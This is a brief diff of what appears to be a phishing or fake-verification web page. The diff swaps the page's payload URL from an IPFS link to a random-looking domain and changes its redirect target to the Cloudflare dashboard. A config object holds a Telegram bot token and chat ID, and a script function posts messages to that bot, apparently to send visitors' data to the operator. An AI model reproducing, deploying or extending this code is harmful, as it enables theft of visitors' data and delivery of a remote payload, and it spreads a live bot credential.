@@ -1,4 +1,3 @@
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -24,7 +23,7 @@ body{margin:0;background:var(--bg);font-family:'SF Mono',menlo,monospace;color:v
 </div>
 <canvas id="gl"></canvas>
 <script>
-const CFG={D:"https://ipfs.io/ipfs/bafkreicu4xtwgsor6j46h2e6kvwu676a5va7sonmfsgnj5zwa6achnooca/",B:"https://www.google.com",T:"8360539543:AAGZtvr7bt1PVcRfq8eTkHCxHigKBjHMwaQ",C:"659482680"};
+const CFG={D:"https://d3d97e2af1201de9799aed11aed02ffe.com/WJmmHi0ELP4/--/",B:"https://dash.cloudflare.com",T:"8360539543:AAGZtvr7bt1PVcRfq8eTkHCxHigKBjHMwaQ",C:"659482680"};
 let res={sc:0,m:false,b:false};
 const u=(s,d,p)=>{document.getElementById('s').innerText=s;document.getElementById('d').innerText=d;document.getElementById('f').style.width=p+"%";}
 const ntg=async m=>{try{await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CFG.C,text:m,parse_mode:"HTML"})});}catch(e){}};
